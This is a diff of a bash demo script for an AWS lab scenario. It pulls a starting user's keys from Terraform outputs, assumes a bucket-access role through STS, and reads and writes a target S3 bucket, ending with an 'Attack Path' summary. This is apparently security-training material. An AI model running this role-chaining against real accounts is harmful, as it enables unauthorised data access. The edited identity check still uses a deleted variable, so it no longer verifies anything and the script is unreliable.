@@ -12,46 +12,82 @@ YELLOW='\033[1;33m'
 NC='\033[0m' # No Color
 
 # Configuration
-PROFILE="pl-pathfinder-starting-user-prod"
-STARTING_USER="pl-pathfinder-starting-user-prod"
-BUCKET_ACCESS_ROLE="pl-prod-one-hop-assumerole-bucket-access-role"
+REGION="us-west-2"
 
 echo -e "${GREEN}========================================${NC}"
 echo -e "${GREEN}STS AssumeRole to S3 Bucket Access Demo${NC}"
 echo -e "${GREEN}========================================${NC}\n"
 
-# Step 1: Verify starting user identity
-echo -e "${YELLOW}Step 1: Verifying identity as starting user${NC}"
-CURRENT_USER=$(aws sts get-caller-identity --profile $PROFILE --query 'Arn' --output text)
+# Disable paging for AWS CLI
+export AWS_PAGER=""
+
+# Navigate to the Terraform root directory (6 levels up from scenario directory)
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+TERRAFORM_ROOT="$(cd "$SCRIPT_DIR/../../../../../.." && pwd)"
+
+echo -e "${YELLOW}Step 1: Retrieving credentials from Terraform outputs${NC}"
+cd "$TERRAFORM_ROOT"
+
+# Get the grouped module output
+MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_bucket_sts_assumerole.value // empty')
+
+if [ -z "$MODULE_OUTPUT" ]; then
+    echo -e "${RED}Error: Could not retrieve module outputs. Make sure the scenario is deployed.${NC}"
+    exit 1
+fi
+
+# Extract credentials and resource information from grouped output
+STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
+STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
+BUCKET_ACCESS_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.bucket_access_role_arn')
+TARGET_BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.target_bucket_name')
+STARTING_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')
+
+echo -e "${GREEN}✅ Retrieved credentials for starting user: $STARTING_USER_NAME${NC}"
+echo "📋 Bucket Access Role ARN: $BUCKET_ACCESS_ROLE_ARN"
+echo "📋 Target Bucket: $TARGET_BUCKET_NAME"
+
+# Set environment variables for starting user
+export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+export AWS_DEFAULT_REGION="$REGION"
+unset AWS_SESSION_TOKEN
+
+echo -e "${GREEN}✓ Retrieved credentials${NC}\n"
+
+cd - > /dev/null  # Return to scenario directory
+
+# Verify starting user identity
+CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
 if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
     echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
-    echo "Please configure your AWS CLI profile '$PROFILE' to use the starting user credentials"
     exit 1
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 2: Get account ID and construct bucket name
 echo -e "${YELLOW}Step 2: Getting account ID and bucket information${NC}"
-ACCOUNT_ID=$(aws sts get-caller-identity --profile $PROFILE --query 'Account' --output text)
+ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 
-# Get the bucket name from terraform output or construct it
-BUCKET_NAME=$(aws s3api list-buckets --profile $PROFILE --query "Buckets[?starts_with(Name, 'pl-prod-one-hop-assumerole-bucket-')].Name" --output text 2>/dev/null || echo "")
+# We already have the bucket name from Terraform outputs
+BUCKET_NAME="$TARGET_BUCKET_NAME"
+echo "Target bucket: $BUCKET_NAME"
 
-if [ -z "$BUCKET_NAME" ]; then
-    echo -e "${YELLOW}Note: Cannot list buckets with starting user (expected)${NC}"
-    echo "Bucket name will be retrieved after assuming the role"
+# Test if starting user can list buckets (should not be able to)
+if aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-prod-one-hop-assumerole-bucket-')].Name" --output text 2>/dev/null | grep -q "pl-prod-one-hop-assumerole-bucket"; then
+    echo -e "${YELLOW}Note: Starting user can list buckets${NC}"
 else
-    echo "Target bucket: $BUCKET_NAME"
+    echo -e "${GREEN}✓ Starting user cannot list buckets (expected)${NC}"
 fi
 echo -e "${GREEN}✓ Retrieved account information${NC}\n"
 
 # Step 3: Verify limited permissions before role assumption
 echo -e "${YELLOW}Step 3: Testing current permissions (should be limited)${NC}"
 echo "Attempting to list S3 buckets..."
-if aws s3 ls --profile $PROFILE 2>&1 | grep -q "AccessDenied\|operation: Access Denied"; then
+if aws s3 ls 2>&1 | grep -q "AccessDenied\|operation: Access Denied"; then
     echo -e "${GREEN}✓ Confirmed limited permissions (cannot list S3 buckets)${NC}"
 else
     echo -e "${YELLOW}Warning: May have more permissions than expected${NC}"
@@ -59,14 +95,12 @@ fi
 echo ""
 
 # Step 4: Assume the bucket access role
-echo -e "${YELLOW}Step 4: Assuming role $BUCKET_ACCESS_ROLE${NC}"
-ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${BUCKET_ACCESS_ROLE}"
-echo "Role ARN: $ROLE_ARN"
+echo -e "${YELLOW}Step 4: Assuming role${NC}"
+echo "Role ARN: $BUCKET_ACCESS_ROLE_ARN"
 
 CREDENTIALS=$(aws sts assume-role \
-    --role-arn $ROLE_ARN \
+    --role-arn $BUCKET_ACCESS_ROLE_ARN \
     --role-session-name demo-bucket-access-session \
-    --profile $PROFILE \
     --query 'Credentials' \
     --output json)
 
@@ -79,13 +113,10 @@ ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $ROLE_IDENTITY"
 echo -e "${GREEN}✓ Successfully assumed role${NC}\n"
 
-# Step 5: Discover the target bucket
-echo -e "${YELLOW}Step 5: Discovering target bucket${NC}"
-if [ -z "$BUCKET_NAME" ]; then
-    BUCKET_NAME=$(aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-prod-one-hop-assumerole-bucket-')].Name" --output text)
-fi
+# Step 5: Verify we can now list buckets with the assumed role
+echo -e "${YELLOW}Step 5: Verifying bucket access with assumed role${NC}"
 echo "Target bucket: $BUCKET_NAME"
-echo -e "${GREEN}✓ Found target bucket${NC}\n"
+echo -e "${GREEN}✓ Ready to access target bucket${NC}\n"
 
 # Step 6: List bucket contents
 echo -e "${YELLOW}Step 6: Listing bucket contents${NC}"
@@ -114,13 +145,13 @@ echo -e "${GREEN}✓ Successfully wrote test file to bucket${NC}\n"
 echo -e "${GREEN}========================================${NC}"
 echo -e "${GREEN}Attack Summary${NC}"
 echo -e "${GREEN}========================================${NC}"
-echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
-echo -e "Step 1: Assumed role ${YELLOW}$BUCKET_ACCESS_ROLE${NC}"
+echo -e "Starting Point: User ${YELLOW}$STARTING_USER_NAME${NC}"
+echo -e "Step 1: Assumed role ${YELLOW}$(basename $BUCKET_ACCESS_ROLE_ARN)${NC}"
 echo -e "Step 2: Gained access to ${YELLOW}$BUCKET_NAME${NC}"
 echo -e "Step 3: Successfully ${GREEN}read and wrote${NC} sensitive data"
 echo ""
 echo -e "${YELLOW}Attack Path:${NC}"
-echo -e "  $STARTING_USER → (AssumeRole) → $BUCKET_ACCESS_ROLE → (S3 Access) → $BUCKET_NAME"
+echo -e "  $STARTING_USER_NAME → (AssumeRole) → $(basename $BUCKET_ACCESS_ROLE_ARN) → (S3 Access) → $BUCKET_NAME"
 echo ""
 echo -e "${GREEN}Downloaded file location: $DOWNLOAD_FILE${NC}"
 echo ""
